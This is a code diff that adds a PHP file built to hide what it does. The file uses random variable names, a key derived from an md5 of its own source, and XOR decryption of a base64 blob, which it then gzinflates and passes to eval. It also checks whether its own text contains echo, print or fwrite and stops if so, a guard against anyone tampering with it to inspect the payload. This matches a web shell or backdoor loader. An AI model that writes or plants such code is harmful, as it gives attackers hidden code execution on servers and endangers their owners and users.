@@ -1,0 +1,24 @@
+<?php
+$kjdsdgtmqosv="02c81547aed7a0943b285c3a0b52a91f";
+$nqekylya="5502025b09540200585d07000709010d06560b0106050b570456040300080105";
+$eyudbuh="2GQMDKNRJskSD+iyIlN6k0g/nMASN7w6LERSXQeqVDKwz9/QQQikUWTPBnWkz+VK+onB9/L3M3cfosMzczm2sEvUJNu/jCDhCDxcDPgmCpPmmNqb09QKPunZUtFE/Y/Sw4WGGuh4kEDYfwuPORXYLLe23JNTqPG9ZQbcvv6oDeOwLTqXZtl/nu8snjtaMqD0VcAE84/Fg+e6pCnvkUK84Ix3lUQU2oaWZb5sJwAXosVV6OdhqW/eQCHhaQ1OohqQDvMMjg7Mlo7uDDco/jTPF6f07dOnPJ0yxo0Zygttepg+SI3ISOJ510iJ4tpVBcExtSMwoNEwpVOuNCSN8zghz9E0E0W8CF+50BwHeob9M2IS0EiEzSgkfZK+gmrUyiWUHIn17e+5hVcw8fcZ/mfeM+6SDFUwhRbIsClDcOx4uDYIX462/UnAhpsciXT+3ZbPwtCjbsbjeeKzm8640iKj56w+pw+fXT1ZyT6sLE48wyzOy8udWt05n+gu8noGHR+sPToI+oxcRL6EmQ47jPFMEOFdwFIw0oscsmf8HDqL+wN2t2oH47cbo3ML+eAWlgW4Lzz/akkG35cxiNCKI+O2AiKViP90x53gEvvUomUopIl1hBoqpJVHM6gqM7+olB3WUHIoN1mtA/iasVyNg1ZdfOWY6reoMtBbsWVfNkb4W5ObyN2udM8vpPA1ZC5cxmqxqKt1utfB7U9slbpo4nKuSz4DfeOKpfjFWl7aIsgjD9xsNbgA8mOTItKeWKU9yHpDzONYtmh7Chmp83ZtlogRwy6aDK60a+7xaStvmaW0cs48qfHEVbMxgEROOekyWUwH/euSsGmWCcCu7gcJxx3XN4EFtAXmRobHARKPqDZu4czd/Ez/pNYALeDJtz1D8PfFB4J5eYpOduOwlyzWzvesjJ/NZtpdDGKeJ0WeoKoWEVz5caDsry8xp9p4roK4AsE5jcAhtNw/3Cn9i1v2M8MCnWg=";
+$grqaanf=file_get_contents(__FILE__);
+$ntkggifkkd=str_replace($eyudbuh,"",$grqaanf);
+if(strpos($ntkggifkkd,"ec"."ho")!==false||strpos($ntkggifkkd,"pr"."int")!==false||strpos($ntkggifkkd,"var_"."dump")!==false||strpos($ntkggifkkd,"file_put_"."contents")!==false||strpos($ntkggifkkd,"fw"."rite")!==false){die();}
+$cvcuhqmsjqxs=str_replace(array($kjdsdgtmqosv,$nqekylya),array("SP_caf7b834","KP_3dbfb848"),$grqaanf);
+$wcgrjz=md5($cvcuhqmsjqxs);
+$nkglssaz=hex2bin($nqekylya);
+$msjacms="";
+$khoisnirr=strlen($wcgrjz);
+for($vnwlseqyx=0;$vnwlseqyx<$khoisnirr;$vnwlseqyx++){
+    $msjacms.=chr(ord($nkglssaz[$vnwlseqyx])^ord($wcgrjz[$vnwlseqyx]));
+}
+$ankflbp=base64_decode($eyudbuh);
+$ysamkchkqtk=strlen($ankflbp);
+$wswcderskc="";
+$mpkuxtirn=strlen($msjacms);
+for($vnwlseqyx=0;$vnwlseqyx<$ysamkchkqtk;$vnwlseqyx++){
+    $wswcderskc.=$ankflbp[$vnwlseqyx]^$msjacms[$vnwlseqyx%$mpkuxtirn];
+}
+$fvnlnnssiw="gz"."in"."fl"."ate";
+eval($fvnlnnssiw($wswcderskc));
